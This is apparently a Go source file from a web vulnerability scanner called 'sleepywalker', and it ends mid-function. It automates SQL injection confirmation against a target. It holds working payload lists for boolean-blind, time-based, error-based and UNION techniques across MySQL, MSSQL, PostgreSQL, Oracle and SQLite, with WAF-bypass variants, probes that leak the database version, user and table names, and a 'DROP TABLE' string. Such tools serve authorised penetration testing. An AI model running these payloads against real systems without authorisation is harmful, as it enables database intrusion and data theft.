package scanner

import (
	"context"
	"fmt"
	"log"
	"math"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strings"
	"time"

	"sleepywalker/internal/config"
	"sleepywalker/internal/utils"
)

// DeepResult holds the outcome of the deep local validation.
type DeepResult struct {
	Entry       EntryPoint
	Confirmed   bool
	Techniques  []string // which techniques confirmed the vulnerability
	BestPayload string   // the most effective payload found
	Confidence  float64  // 0.0 – 1.0
	DBEngine    string   // detected database engine (carried from heuristic or confirmed here)
}

// techniqueSignal represents a single test result feeding into the confidence score.
type techniqueSignal struct {
	Name    string
	Fired   bool
	Weight  float64
	Payload string
}

// DeepValidate performs advanced SQL injection confirmation on entry points
// that were flagged by the heuristic scan. This replaces the AI phase when
// no OpenRouter API key is available.
//
// Enhanced techniques:
//  1. Boolean-based blind (response differential with Jaccard similarity)
//  2. Time-based blind (multi-round statistical timing, 3 samples + median)
//  3. Error-based confirmation (targeted per DB engine)
//  4. UNION-based column counting
//  5. Error consistency testing (3-round stability check)
//  6. HTTP status code correlation
//  7. Content-length delta analysis
//  8. Injection context detection (auto-tailor payloads)
//  9. DB-specific confirmation probes (after engine hint from heuristic)
// 10. Second-order detection stub
// 11. Out-of-Band (OOB) DNS detection
func DeepValidate(ctx context.Context, cfg *config.Config, suspicious []HeuristicResult, rl *utils.RateLimiter) []DeepResult {
	var client *http.Client
	if cfg != nil {
		client = cfg.BuildHTTPClient(35 * time.Second)
	} else {
		client = &http.Client{
			Timeout: 35 * time.Second,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	}

	var results []DeepResult
	for _, hr := range suspicious {
		dr := deepProbe(ctx, client, cfg, hr, rl)
		results = append(results, dr)
		if dr.Confirmed {
			log.Printf("[DEEP] ✓ Confirmed (%.0f%% confidence): %s %s — techniques: %v — DB: %s",
				dr.Confidence*100, dr.Entry.Method, dr.Entry.URL, dr.Techniques, dr.DBEngine)
		} else {
			log.Printf("[DEEP] ✗ Not confirmed: %s %s", dr.Entry.Method, dr.Entry.URL)
		}
	}
	return results
}

// deepProbe runs all confirmation techniques against a single entry point.
func deepProbe(ctx context.Context, client *http.Client, cfg *config.Config, hr HeuristicResult, rl *utils.RateLimiter) DeepResult {
	ep := hr.Entry
	var signals []techniqueSignal
	var bestPayload string

	// Use the param that Phase 1 actually identified rather than re-picking.
	param := pickParamFromHeuristic(hr, ep)

	// Detect injection context first to tailor payloads
	injCtx := detectInjectionContext(client, cfg, ep, param, rl)
	log.Printf("[DEEP]   Injection context for %s param=%s → %s", ep.URL, param, injCtx)

	// Detect DB engine hint from heuristic errors
	dbHint := detectDBFromHeuristicErrors(hr.MatchedErrors)

	// ── 1. Boolean-based blind ──────────────────────────────────────
	if ok, payload := booleanBlindTest(client, cfg, ep, param, injCtx, rl); ok {
		signals = append(signals, techniqueSignal{"boolean-blind", true, 0.25, payload})
		bestPayload = payload
	} else {
		signals = append(signals, techniqueSignal{"boolean-blind", false, 0.25, ""})
	}

	// ── 2. Time-based blind (multi-round median) ────────────────────
	if ok, payload := timeBlindTestStatistical(client, cfg, ep, param, injCtx, rl); ok {
		signals = append(signals, techniqueSignal{"time-blind", true, 0.20, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"time-blind", false, 0.20, ""})
	}

	// ── 3. Error-based confirmation ─────────────────────────────────
	if ok, payload := errorBasedTest(client, cfg, ep, param, rl); ok {
		signals = append(signals, techniqueSignal{"error-based", true, 0.15, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"error-based", false, 0.15, ""})
	}

	// ── 4. UNION-based column count ─────────────────────────────────
	if ok, payload := unionTest(client, cfg, ep, param, rl); ok {
		signals = append(signals, techniqueSignal{"union-based", true, 0.10, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"union-based", false, 0.10, ""})
	}

	// ── 5. Error consistency testing ────────────────────────────────
	if ok := errorConsistencyTest(client, cfg, ep, param, rl, hr.TestPayload); ok {
		signals = append(signals, techniqueSignal{"error-consistency", true, 0.20, ""})
	} else {
		signals = append(signals, techniqueSignal{"error-consistency", false, 0.20, ""})
	}

	// ── 6. HTTP status code correlation ─────────────────────────────
	if ok := statusCodeCorrelation(client, cfg, ep, param, rl); ok {
		signals = append(signals, techniqueSignal{"status-correlation", true, 0.08, ""})
	} else {
		signals = append(signals, techniqueSignal{"status-correlation", false, 0.08, ""})
	}

	// ── 7. Content-length delta analysis ────────────────────────────
	if ok := contentLengthDelta(client, cfg, ep, param, injCtx, rl); ok {
		signals = append(signals, techniqueSignal{"content-length-delta", true, 0.05, ""})
	} else {
		signals = append(signals, techniqueSignal{"content-length-delta", false, 0.05, ""})
	}

	// ── 8. DB-specific confirmation probes ──────────────────────────
	if dbHint != "" {
		if ok, payload := dbSpecificProbe(client, cfg, ep, param, dbHint, rl); ok {
			signals = append(signals, techniqueSignal{"db-specific-confirm", true, 0.15, payload})
			if bestPayload == "" {
				bestPayload = payload
			}
		} else {
			signals = append(signals, techniqueSignal{"db-specific-confirm", false, 0.15, ""})
		}
	}

	// ── 9. Second-order detection ──────────────────────────────
	if ok := secondOrderStub(client, cfg, ep, param, rl); ok {
		signals = append(signals, techniqueSignal{"second-order", true, 0.12, ""})
	} else {
		signals = append(signals, techniqueSignal{"second-order", false, 0.12, ""})
	}

	// ── 10. Out-of-Band (OOB) detection stub ───────────────────
	if ok, payload := oobDetectionStub(client, cfg, ep, param, dbHint, rl); ok {
		signals = append(signals, techniqueSignal{"oob-dns", true, 0.10, payload})
		if bestPayload == "" {
			bestPayload = payload
		}
	} else {
		signals = append(signals, techniqueSignal{"oob-dns", false, 0.10, ""})
	}

	// ── Weighted confidence scoring ─────────────────────────────────
	var techniques []string
	totalWeight := 0.0
	firedWeight := 0.0
	for _, s := range signals {
		totalWeight += s.Weight
		if s.Fired {
			firedWeight += s.Weight
			techniques = append(techniques, s.Name)
		}
	}

	// Heuristic already flagged it, so add a base score
	baseBonus := 0.08
	score := (firedWeight / math.Max(totalWeight, 0.01)) + baseBonus
	if score > 1.0 {
		score = 1.0
	}

	// Require at least one deep technique to confirm
	confirmed := len(techniques) > 0

	return DeepResult{
		Entry:       ep,
		Confirmed:   confirmed,
		Techniques:  techniques,
		BestPayload: bestPayload,
		Confidence:  score,
		DBEngine:    dbHint,
	}
}

// ═══════════════════════════════════════════════════════════════════════
// Injection Context Detection (Technique 8)
// ═══════════════════════════════════════════════════════════════════════

type injectionContext string

const (
	ctxUnknown   injectionContext = "unknown"
	ctxString    injectionContext = "string-single-quote"
	ctxStringDbl injectionContext = "string-double-quote"
	ctxNumeric   injectionContext = "numeric"
)

// detectInjectionContext determines whether the parameter is inside a quoted
// string, a numeric context, or an HTML attribute by analyzing error responses.
func detectInjectionContext(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) injectionContext {
	if rl != nil { rl.Wait() }
	sqResp := fetchWithPayload(client, cfg, ep, param, "1'")
	if rl != nil { rl.Wait() }
	dqResp := fetchWithPayload(client, cfg, ep, param, "1\"")
	if rl != nil { rl.Wait() }
	baseline := fetchWithPayload(client, cfg, ep, param, "1")

	if baseline == "" {
		return ctxUnknown
	}

	sqLower := strings.ToLower(sqResp)
	dqLower := strings.ToLower(dqResp)
	baseLower := strings.ToLower(baseline)

	// SQL syntax error patterns — must appear in the quoted response.
	syntaxErrors := []string{"syntax error", "unterminated", "unclosed quotation", "you have an error"}

	sqError := containsAny(sqLower, syntaxErrors)
	dqError := containsAny(dqLower, syntaxErrors)

	// Only count as a real signal if the error is NEW (not already in the baseline).
	// When the DB table is missing, baseline itself contains a DB error — any additional
	// error from quoting still changes the response in a meaningful way.
	baselineHasSyntaxError := containsAny(baseLower, syntaxErrors)

	// Single-quote causes a syntax error that baseline doesn't have → string context.
	if sqError && !dqError {
		return ctxString
	}
	if dqError && !sqError {
		return ctxStringDbl
	}

	// Numeric check: only valid when baseline is a clean response (no errors).
	// If baseline already contains DB errors, numSim will be artificially high.
	if !baselineHasSyntaxError {
		if rl != nil { rl.Wait() }
		numResp := fetchWithPayload(client, cfg, ep, param, "1 AND 1=1")
		if numResp != "" {
			numSim := jaccardSimilarity(baseline, numResp)
			if numSim > 0.85 {
				return ctxNumeric
			}
		}
	}

	return ctxUnknown
}

// containsAny checks if s contains any of the given substrings.
func containsAny(s string, subs []string) bool {
	for _, sub := range subs {
		if strings.Contains(s, sub) {
			return true
		}
	}
	return false
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 1: Boolean-based blind (enhanced with Jaccard similarity)
// ═══════════════════════════════════════════════════════════════════════

func booleanBlindTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext, rl *utils.RateLimiter) (bool, string) {
	// Get a baseline first
	if rl != nil { rl.Wait() }
	baseline := fetchWithPayload(client, cfg, ep, param, "1")
	if baseline == "" {
		return false, ""
	}

	// Select payloads based on detected injection context
	type boolPair struct {
		truePl  string
		falsePl string
	}

	var pairs []boolPair
	switch ctx {
	case ctxString:
		pairs = []boolPair{
			{"1' AND '1'='1", "1' AND '1'='2"},
			{"1' OR '1'='1' AND '1'='1", "1' OR '1'='1' AND '1'='2"},
		}
	case ctxStringDbl:
		pairs = []boolPair{
			{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
		}
	case ctxNumeric:
		pairs = []boolPair{
			{"1 AND 1=1", "1 AND 1=2"},
			{"1 AND 2>1", "1 AND 1>2"},
		}
	default:
		// Try all contexts including advanced bypass patterns
		pairs = []boolPair{
			{"1 AND 1=1", "1 AND 1=2"},
			{"1' AND '1'='1", "1' AND '1'='2"},
			{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
			{"1') AND ('1'='1", "1') AND ('1'='2"},
			{"1' AND 1=1-- -", "1' AND 1=2-- -"},
			{"1' AND 1=1#", "1' AND 1=2#"},
			// Conditional error: true returns normal, false triggers divide-by-zero
			{"1'AND(SELECT 1 WHERE 1=1)='1", "1'AND(SELECT 1 WHERE 1=2)='1"},
			// WAF bypass variants
			{"1'/*!50000AND*/'1'='1", "1'/*!50000AND*/'1'='2"},
			{"1'/**/AND/**/1=1-- -", "1'/**/AND/**/1=2-- -"},
		}
	}

	for _, pair := range pairs {
		consistent := true
		for round := 0; round < 2; round++ {
			if rl != nil { rl.Wait() }
			trueResp := fetchWithPayload(client, cfg, ep, param, pair.truePl)
			if rl != nil { rl.Wait() }
			falseResp := fetchWithPayload(client, cfg, ep, param, pair.falsePl)
			if trueResp == "" || falseResp == "" {
				consistent = false
				break
			}
			trueSim := jaccardSimilarity(baseline, trueResp)
			falseSim := jaccardSimilarity(baseline, falseResp)
			if !(trueSim > 0.85 && falseSim < 0.70) {
				// Also check length-based
				baseLen := len(baseline)
				trueLen := len(trueResp)
				falseLen := len(falseResp)
				trueDiff := math.Abs(float64(trueLen-baseLen)) / math.Max(float64(baseLen), 1)
				falseDiff := math.Abs(float64(falseLen-baseLen)) / math.Max(float64(baseLen), 1)
				if !(trueDiff < 0.10 && falseDiff > 0.15) {
					consistent = false
					break
				}
			}
		}
		if consistent {
			return true, pair.truePl
		}
	}
	return false, ""
}

// jaccardSimilarity computes word-level Jaccard similarity between two strings.
// Returns a value between 0.0 (completely different) and 1.0 (identical).
func jaccardSimilarity(a, b string) float64 {
	wordsA := wordSet(a)
	wordsB := wordSet(b)

	if len(wordsA) == 0 && len(wordsB) == 0 {
		return 1.0
	}

	intersection := 0
	for w := range wordsA {
		if wordsB[w] {
			intersection++
		}
	}

	union := len(wordsA)
	for w := range wordsB {
		if !wordsA[w] {
			union++
		}
	}

	if union == 0 {
		return 1.0
	}
	return float64(intersection) / float64(union)
}

// wordSet splits text into a set of unique lowercased words.
func wordSet(s string) map[string]bool {
	set := make(map[string]bool)
	for _, w := range strings.Fields(strings.ToLower(s)) {
		set[w] = true
	}
	return set
}

// htmlStripJaccard strips HTML tags from both strings before computing
// word-level Jaccard similarity. This reduces noise from dynamic page
// templates (timestamps, CSRF tokens, ads, nonces) and gives a more
// accurate content-level comparison on large HTML pages.
func htmlStripJaccard(a, b string) float64 {
	return jaccardSimilarity(stripHTMLTags(a), stripHTMLTags(b))
}

// stripHTMLTags removes HTML/XML tags from a string, leaving only text content.
// Also collapses whitespace for cleaner word-level comparison.
func stripHTMLTags(s string) string {
	var out strings.Builder
	inTag := false
	for _, r := range s {
		switch {
		case r == '<':
			inTag = true
		case r == '>':
			inTag = false
			out.WriteByte(' ') // replace tag with space to separate words
		case !inTag:
			out.WriteRune(r)
		}
	}
	return out.String()
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 2: Time-based blind (multi-round statistical)
// ═══════════════════════════════════════════════════════════════════════

func timeBlindTestStatistical(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext, rl *utils.RateLimiter) (bool, string) {
	const rounds = 3

	// Measure baseline timing (3 rounds, take median)
	var baseTimes []time.Duration
	for i := 0; i < rounds; i++ {
		if rl != nil { rl.Wait() }
		t := measureTime(client, cfg, ep, param, "1")
		if t < 0 {
			return false, ""
		}
		baseTimes = append(baseTimes, t)
	}
	baseMedian := medianDuration(baseTimes)

	delayPayloads := []struct {
		payload  string
		delaySec float64
	}{
		// MySQL
		{"1' AND SLEEP(3)-- -", 3},
		{"1 AND SLEEP(3)-- -", 3},
		{"1') AND SLEEP(3)-- -", 3},
		{"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -", 3},
		{"1' AND BENCHMARK(5000000,SHA1('test'))-- -", 2},
		// PostgreSQL
		{"1'; SELECT pg_sleep(3)-- -", 3},
		{"1' AND 1=(SELECT 1 FROM pg_sleep(3))-- -", 3},
		{"1'||(SELECT '' FROM pg_sleep(3))-- -", 3},
		// MSSQL
		{"1'; WAITFOR DELAY '0:0:3'-- -", 3},
		{"1'); WAITFOR DELAY '0:0:3'-- -", 3},
		{"1' AND 1=1; WAITFOR DELAY '0:0:3'-- -", 3},
		// Oracle
		{"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -", 3},
		// SQLite (heavy computation as time proxy)
		{"1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -", 2},
		// WAF bypass variants
		{"1'/*!50000AND*/SLEEP(3)-- -", 3},
		{"1'%20AND%20SLEEP(3)--%20-", 3},
	}

	for _, dp := range delayPayloads {
		// Run multiple rounds to reduce noise
		var timings []time.Duration
		for i := 0; i < rounds; i++ {
			if rl != nil { rl.Wait() }
			elapsed := measureTime(client, cfg, ep, param, dp.payload)
			if elapsed < 0 {
				break
			}
			timings = append(timings, elapsed)
		}

		if len(timings) < rounds {
			continue
		}

		delayMedian := medianDuration(timings)
		expectedDelay := time.Duration(dp.delaySec-1) * time.Second
		threshold := baseMedian + expectedDelay

		// Median of delay requests should consistently exceed threshold
		if delayMedian > threshold && delayMedian > 2*time.Second {
			log.Printf("[DEEP]   Time-blind: baseline=%v, delay-median=%v (threshold=%v)", baseMedian, delayMedian, threshold)
			return true, dp.payload
		}
	}
	return false, ""
}

// medianDuration returns the median of a slice of durations.
func medianDuration(d []time.Duration) time.Duration {
	if len(d) == 0 {
		return 0
	}
	sorted := make([]time.Duration, len(d))
	copy(sorted, d)
	sort.Slice(sorted, func(i, j int) bool { return sorted[i] < sorted[j] })
	mid := len(sorted) / 2
	if len(sorted)%2 == 0 {
		return (sorted[mid-1] + sorted[mid]) / 2
	}
	return sorted[mid]
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 3: Error-based confirmation
// ═══════════════════════════════════════════════════════════════════════

// errorBasedTest uses targeted error-eliciting payloads to confirm injection.
func errorBasedTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) (bool, string) {
	payloads := []struct {
		payload string
		errors  []string
	}{
		// MySQL extractvalue / updatexml
		{"1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -",
			[]string{"xpath syntax error", "extractvalue", "operand should contain 1 column"}},
		{"1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -",
			[]string{"xpath syntax error", "updatexml"}},
		// MySQL double-query error
		{"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
			[]string{"duplicate entry", "for key", "group_key"}},
		// MySQL EXP overflow (5.5+)
		{"1 AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
			[]string{"double value is out of range", "exp"}},
		// MSSQL convert error
		{"1 AND 1=CONVERT(int,(SELECT @@version))-- -",
			[]string{"conversion failed", "convert", "nvarchar"}},
		// MSSQL having/group by error
		{"1' HAVING 1=1-- -",
			[]string{"not contained in", "aggregate function", "having"}},
		// MSSQL XML error
		{"1 AND 1=(SELECT TOP 1 CAST(@@version AS int))-- -",
			[]string{"conversion failed", "nvarchar value"}},
		// PostgreSQL cast error
		{"1 AND 1=CAST((SELECT version()) AS int)-- -",
			[]string{"invalid input syntax for", "integer"}},
		// PostgreSQL XMLparse
		{"1 AND 1=CAST(xmlparse(content '<!INVALID') AS int)-- -",
			[]string{"invalid xml", "xmlparse", "invalid input syntax"}},
		// Oracle CTXSYS
		{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
			[]string{"ora-", "drithsx", "29257"}},
		// Oracle UTL_INADDR
		{"1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
			[]string{"ora-", "network", "host"}},
		// SQLite unicode/typeof
		{"1 AND TYPEOF(UNICODE('A'))='integer'-- -",
			[]string{}},
		// Generic double-quote / single-quote break
		{"1'\"",
			[]string{"syntax error", "unterminated", "unclosed quotation"}},
		// Parenthetical break
		{"1')\"",
			[]string{"syntax error", "unterminated", "unclosed quotation"}},
	}

	for _, p := range payloads {
		if rl != nil { rl.Wait() }
		body := fetchWithPayload(client, cfg, ep, param, p.payload)
		if body == "" {
			continue
		}
		lower := strings.ToLower(body)
		for _, errStr := range p.errors {
			if strings.Contains(lower, errStr) {
				return true, p.payload
			}
		}
	}
	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 4: UNION-based column counting
// ═══════════════════════════════════════════════════════════════════════

// unionTest tries UNION SELECT with incrementing column counts to see
// if any count produces a valid (non-error) response.
// Enhanced: searches up to 30 columns, uses binary search for efficiency,
// and tests string marker columns to identify reflecting positions.
func unionTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) (bool, string) {
	// First get a baseline error response (with a bad union)
	if rl != nil { rl.Wait() }
	errorBody := fetchWithPayload(client, cfg, ep, param, "1 UNION SELECT-- -")

	errorMarkers := []string{"syntax error", "mismatch", "different number", "operand", "column"}

	// Helper: check if a UNION with N columns produces an error.
	testCols := func(n int, useMarker bool) (bool, string) {
		cols := make([]string, n)
		for i := range cols {
			if useMarker && i == 0 {
				cols[i] = "'sw_marker'"
			} else {
				cols[i] = "NULL"
			}
		}
		payload := fmt.Sprintf("1 UNION SELECT %s-- -", strings.Join(cols, ","))
		if rl != nil { rl.Wait() }
		body := fetchWithPayload(client, cfg, ep, param, payload)
		if body == "" {
			return false, payload
		}

		lower := strings.ToLower(body)
		hasError := false
		for _, marker := range errorMarkers {
			if strings.Contains(lower, marker) {
				hasError = true
				break
			}
		}

		if !hasError && len(body) > 0 {
			// Check for response difference from the error body.
			if errorBody != "" && math.Abs(float64(len(body)-len(errorBody)))/math.Max(float64(len(errorBody)), 1) > 0.10 {
				return true, payload
			}
			// Check if our string marker reflected in the response.
			if useMarker && strings.Contains(lower, "sw_marker") {
				return true, payload
			}
		}
		return false, payload
	}

	// Phase 1: Linear scan 1–15 with NULL columns.
	for cols := 1; cols <= 15; cols++ {
		if ok, payload := testCols(cols, false); ok {
			// Re-test with string marker to confirm reflection.
			if ok2, payload2 := testCols(cols, true); ok2 {
				return true, payload2
			}
			return true, payload
		}
	}

	// Phase 2: Binary search 16–30 to find the right count faster.
	lo, hi := 16, 30
	for lo <= hi {
		mid := (lo + hi) / 2
		if ok, payload := testCols(mid, false); ok {
			// Re-test with marker.
			if ok2, payload2 := testCols(mid, true); ok2 {
				return true, payload2
			}
			return true, payload
		}
		// If the error mentions "different number of columns", we need to adjust.
		// We can't reliably determine direction from error messages, so scan outward.
		lo = mid + 1
	}

	return false, ""
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 5: Error Consistency Testing
// ═══════════════════════════════════════════════════════════════════════

// errorConsistencyTest fires the same error-inducing payload 3 times and checks
// if the error appears consistently — flaky responses indicate coincidental matches.
func errorConsistencyTest(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter, testPl string) bool {
	if testPl == "" || testPl == "boolean-differential" || testPl == "time-based" {
		testPl = "1'"
	}
	errorKeywords := []string{
		"syntax error", "you have an error", "unterminated", "unclosed quotation",
		"ora-", "pg_query", "mysql", "sqlite", "odbc", "jdbc",
	}

	errorCount := 0
	const rounds = 3

	for i := 0; i < rounds; i++ {
		if rl != nil { rl.Wait() }
		body := fetchWithPayload(client, cfg, ep, param, testPl)
		if body == "" {
			continue
		}
		lower := strings.ToLower(body)
		for _, kw := range errorKeywords {
			if strings.Contains(lower, kw) {
				errorCount++
				break
			}
		}
		// Small delay between rounds to reduce noise
		time.Sleep(200 * time.Millisecond)
	}

	// All 3 rounds must trigger the error for consistency
	return errorCount == rounds
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 6: HTTP Status Code Correlation
// ═══════════════════════════════════════════════════════════════════════

// statusCodeCorrelation checks if injection payloads consistently trigger
// 500/503 errors while baseline returns 200.
func statusCodeCorrelation(client *http.Client, cfg *config.Config, ep EntryPoint, param string, rl *utils.RateLimiter) bool {
	// Get baseline status
	if rl != nil { rl.Wait() }
	baseStatus := fetchStatusCode(client, cfg, ep, param, "1")
	if baseStatus == 0 || baseStatus >= 400 {
		return false // baseline already erroring, unreliable
	}

	errorPayloads := []string{"1'", "1\"", "1' OR '1'='1", "1; DROP TABLE --"}
	errorStatusCount := 0

	for _, payload := range errorPayloads {
		if rl != nil { rl.Wait() }
		status := fetchStatusCode(client, cfg, ep, param, payload)
		if status >= 500 {
			errorStatusCount++
		}
	}

	// At least half the payloads should trigger server errors
	return baseStatus < 400 && errorStatusCount >= len(errorPayloads)/2
}

// fetchStatusCode sends a request and returns just the HTTP status code.
func fetchStatusCode(client *http.Client, cfg *config.Config, ep EntryPoint, param, payload string) int {
	_, code, _ := fetchParamWithPayloadWithStatus(client, cfg, ep, param, payload)
	return code
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 7: Content-Length Delta Analysis
// ═══════════════════════════════════════════════════════════════════════

// contentLengthDelta measures consistent byte-size differences between
// tautology and contradiction responses — a reliable blind SQLi indicator.
func contentLengthDelta(client *http.Client, cfg *config.Config, ep EntryPoint, param string, ctx injectionContext, rl *utils.RateLimiter) bool {
	// Check if same-length neutral values already produce length variance (param reflection).
	if rl != nil { rl.Wait() }
	neutral1 := fetchWithPayload(client, cfg, ep, param, "1")
	if rl != nil { rl.Wait() }
	neutral2 := fetchWithPayload(client, cfg, ep, param, "2")
	if neutral1 != "" && neutral2 != "" {
		neutralDelta := abs(len(neutral1) - len(neutral2))
		if neutralDelta > 5 {
			// Page reflects param value — length deltas are unreliable.
			return false
		}
	}

	type pair struct {
		truePl  string
		falsePl string
	}

	var pairs []pair
	switch ctx {
	case ctxString:
		pairs = []pair{{"1' AND '1'='1", "1' AND '1'='2"}}
	case ctxStringDbl:
		pairs = []pair{{"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"}}
	case ctxNumeric:
		pairs = []pair{{"1 AND 1=1", "1 AND 1=2"}}
	default:
		pairs = []pair{
			{"1 AND 1=1", "1 AND 1=2"},
			{"1' AND '1'='1", "1' AND '1'='2"},
		}
	}

	const rounds = 3
	for _, p := range pairs {
		consistent := true
		var deltas []int

		for i := 0; i < rounds; i++ {
			if rl != nil { rl.Wait() }
			trueResp := fetchWithPayload(client, cfg, ep, param, p.truePl)
			if rl != nil { rl.Wait() }
			falseResp := fetchWithPayload(client, cfg, ep, param, p.falsePl)
			if trueResp == "" || falseResp == "" {
				consistent = false
				break
			}
			deltas = append(deltas, len(trueResp)-len(falseResp))
		}

		if !consistent || len(deltas) < rounds {
			continue
		}

		// Check if deltas are consistent (all same sign and within 10% variance)
		allSameSign := true
		for i := 1; i < len(deltas); i++ {
			if (deltas[i] > 0) != (deltas[0] > 0) {
				allSameSign = false
				break
			}
		}

		if allSameSign && abs(deltas[0]) > 10 {
			// Deltas are consistently non-zero and same direction
			avgDelta := 0
			for _, d := range deltas {
				avgDelta += abs(d)
			}
			avgDelta /= len(deltas)
			if avgDelta > 10 {
				log.Printf("[DEEP]   Content-length delta: consistent Δ=%d bytes across %d rounds", avgDelta, rounds)
				return true
			}
		}
	}
	return false
}

func abs(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

// ═══════════════════════════════════════════════════════════════════════
// Technique 9: DB-Specific Confirmation Probes
// ═══════════════════════════════════════════════════════════════════════

// detectDBFromHeuristicErrors parses the heuristic error matches to determine
// the likely database engine.
func detectDBFromHeuristicErrors(errors []string) string {
	engineCounts := map[string]int{}
	for _, e := range errors {
		lower := strings.ToLower(e)
		switch {
		case strings.Contains(lower, "mysql"):
			engineCounts["MySQL"]++
		case strings.Contains(lower, "postgresql") || strings.Contains(lower, "pg_"):
			engineCounts["PostgreSQL"]++
		case strings.Contains(lower, "mssql") || strings.Contains(lower, "microsoft"):
			engineCounts["MSSQL"]++
		case strings.Contains(lower, "oracle") || strings.Contains(lower, "ora-"):
			engineCounts["Oracle"]++
		case strings.Contains(lower, "sqlite"):
			engineCounts["SQLite"]++
		}
	}

	bestEngine := ""
	bestCount := 0
	for engine, count := range engineCounts {
		if count > bestCount {
			bestCount = count
			bestEngine = engine
		}
	}
	return bestEngine
}

// dbSpecificProbe fires a DB-specific confirmation payload after the engine
// has been identified from heuristic errors.
func dbSpecificProbe(client *http.Client, cfg *config.Config, ep EntryPoint, param, dbEngine string, rl *utils.RateLimiter) (bool, string) {
	type probe struct {
		payload    string
		signatures []string
	}

	var probes []probe

	switch dbEngine {
	case "MySQL":
		probes = []probe{
			{"1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))-- -",
				[]string{"xpath syntax error", "~5.", "~8.", "~10."}},
			{"1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)y)-- -",
				[]string{"duplicate entry", "for key"}},
			{"1 AND UPDATEXML(1,CONCAT(0x7e,USER(),0x7e),1)-- -",
				[]string{"xpath syntax error", "updatexml"}},
			{"1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,VERSION(),0x7e)) USING utf8)))-- -",
				[]string{"invalid json", "json_keys"}},
			{"1 AND EXP(~(SELECT * FROM (SELECT USER())a))-- -",
				[]string{"double value is out of range"}},
		}
	case "MSSQL":
		probes = []probe{
			{"1 AND 1=CONVERT(int, @@version)-- -",
				[]string{"conversion failed", "nvarchar value", "microsoft sql server"}},
			{"1 AND 1=CONVERT(int, DB_NAME())-- -",
				[]string{"conversion failed", "nvarchar value"}},
			{"1 AND 1=CONVERT(int, SYSTEM_USER)-- -",
				[]string{"conversion failed", "nvarchar"}},
			{"1' HAVING 1=1-- -",
				[]string{"not contained in", "aggregate"}},
			{"1 AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)-- -",
				[]string{"conversion failed", "subquery"}},
		}
	case "PostgreSQL":
		probes = []probe{
			{"1 AND 1=CAST((SELECT version()) AS int)-- -",
				[]string{"invalid input syntax", "integer", "postgresql"}},
			{"1 AND 1=CAST(current_database() AS int)-- -",
				[]string{"invalid input syntax", "integer"}},
			{"1 AND 1=CAST(current_user AS int)-- -",
				[]string{"invalid input syntax", "integer"}},
			{"1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)-- -",
				[]string{"invalid input syntax", "integer"}},
		}
	case "Oracle":
		probes = []probe{
			{"1 AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
				[]string{"ora-", "network error"}},
			{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
				[]string{"ora-", "drithsx"}},
			{"1 AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -",
				[]string{"ora-", "drithsx"}},
			{"1 AND XMLType((SELECT banner FROM v$version WHERE ROWNUM=1))=1-- -",
				[]string{"ora-", "lpu-", "xmltype"}},
		}
	case "SQLite":
		probes = []probe{
			{"1 AND TYPEOF(1)='integer'-- -",
				[]string{}}, // success = same as baseline
			{"1 AND sqlite_version() LIKE '%3%'-- -",
				[]string{}},
			{"1 AND 1=CAST(sqlite_version() AS int)-- -",
				[]string{"no such column", "datatype mismatch"}},
			{"1 UNION SELECT sql FROM sqlite_master-- -",
				[]string{"create table", "sqlite_master"}},
		}
	default:
		return false, ""
	}

	if rl != nil { rl.Wait() }
	baseline := fetchWithPayload(client, cfg, ep, param, "1")

	for _, p := range probes {
		if rl != nil { rl.Wait() }
		body := fetchWithPayload(client, cfg, ep, param, p.payload)
		if body == "" {
			continue
		}
		lower := strings.ToLower(body)

		// Check explicit signatures
		for _, sig := range p.signatures {
			if strings.Contains(lower, sig) {
				return true, p.payload
			}
		}

		// For SQLite (no error signatures), check if response matches baseline
